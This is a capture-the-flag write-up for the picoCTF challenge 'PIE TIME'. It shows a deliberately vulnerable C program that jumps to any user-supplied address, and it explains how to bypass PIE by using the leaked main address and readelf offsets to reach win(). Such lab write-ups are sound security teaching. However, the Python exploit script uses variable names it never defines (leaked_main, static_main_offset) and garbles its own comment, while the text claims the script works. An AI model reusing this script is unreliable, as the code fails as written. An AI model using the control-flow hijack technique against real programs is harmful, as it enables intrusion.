# PIE TIME

- **Category:** [Binary Exploitation]
- **Difficulty:** Easy
- **Description:** Can you try to get the flag? Beware we have PIE!

## 1. Problem Analysis

In this problem we are given a netcat address to connect to a program that we need to exploit. The problem also gives us the C file called `vuln.c` and the binary file `vuln`. Our goal is to exploit the binary file and the C file to retrieve a flag.

## 2. Approach

Lets take a look at the C file below:

```
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void segfault_handler() {
  printf("Segfault Occurred, incorrect address.\n");
  exit(0);
}

int win() {
  FILE *fptr;
  char c;

  printf("You won!\n");
  // Open file
  fptr = fopen("flag.txt", "r");
  if (fptr == NULL)
  {
      printf("Cannot open file.\n");
      exit(0);
  }

  // Read contents from file
  c = fgetc(fptr);
  while (c != EOF)
  {
      printf ("%c", c);
      c = fgetc(fptr);
  }

  printf("\n");
  fclose(fptr);
}

int main() {
  signal(SIGSEGV, segfault_handler);
  setvbuf(stdout, NULL, _IONBF, 0); // _IONBF = Unbuffered

  printf("Address of main: %p\n", &main);

  unsigned long val;
  printf("Enter the address to jump to, ex => 0x12345: ");
  scanf("%lx", &val);
  printf("Your input: %lx\n", val);

  void (*foo)(void) = (void (*)())val;
  foo();
}
```

The C file above is a simple program that has three functions: `segfault_handler`, `win`, and `main`. When we run the program, the main function is executed, and it prints the following:

```
Address of main: 0x5849aa6d033d
Enter the address to jump to, ex => 0x12345:
```

**Keep in mind that the address is different every time you run the program because of PIE (Position Independent Executable).**

The program then waits for a user to input an address in this case a hexadecimal address and looking at the code, we can see that the address we input is then cast to a function pointer and then called. If we were to input the address of the `win` function, we could execute it and get the flag; however, we don't know the address of the `win` function because of PIE or Position Independent Executable. PIE is a security feature that randomizes the memory address of code when the program is executed; you can read more about it [here](https://en.wikipedia.org/wiki/Position-independent_code).

To solve this problem we need to find the address of the `win` function and to do that we can use the `readelf` command to read the information about the binary file. We need to find the offsets of the `main` function and the `win` function of the binary file and to do that we use `readelf -s ./vuln | grep main` and `readelf -s ./vuln | grep win`. The output of these commands will give us the offsets of the `main` and `win` functions in the binary file.

After that we need to calculate the address of the `win` function by using the address of the `main` function and the offsets of the `main` and `win` functions. We already get the address of the `main` function when we run the program so we can use that and we get the offsets of the `main` and `win` functions from the output of the `readelf` command. The address of the `win` function can be calculated using a python script as follows:

```
main = 0x5a211d84133d #Replace with the address of main from the program output
main_offset = 0x133d  #Offset of main function from readelf
win_offset = 0x12a7 #Offset of win function from readelf

base_addr = leaked_main - static_main_offset #Calculate base address of the binary file by subtracting the offset of main by the address of main to get the exact address of the binary file

win_runtime = base_addr + static_win_offset #Calculate the address of the win function at runtime by adding the base address of the binary file and the offset of the win function

print(f"Base address:      {hex(base_addr)}") #Print the base address of the binary file
print(f"win() address:     {hex(win_runtime)}") #Print the address of the win function at runtime
```

Using this script, we can calculate the address of the `win` function and the program will give us the flag when we input the address of the `win` function. Just make sure to run the script every time you run the program to get the correct address of the `win` function because the main address will change every time you run the program due to PIE.

## 3. Vulnerability

The main vulnerability in this program and the challenge is that the program tells us the address of the `main` function and it allows us to input an address to jump to without any checks or sanitization. Although the program uses PIE to randomize the memory address of the code, it still allows us to input a function address and executes. If an attacker can find the address of a function by using the tools we used in this challenge, they can exploit the program and execute functions that could damage the system or retrieve sensitive information like the flag in this case.

## 4. Flag

After running the script and inputting the address of the `win` function, we get the flag `picoCTF{***************}`.

## 5. Key Takeaways

- **Understanding PIE is an important part of binary exploitation; it deals with addresses and low-level programming, which is important for us to know so we can protect our programs from attacks.**
- **Using tools like `readelf` can help us understand binary files and know how to exploit them for future challenges.**
- **Always be careful handling user input, especially when it comes to addresses and function pointers.**
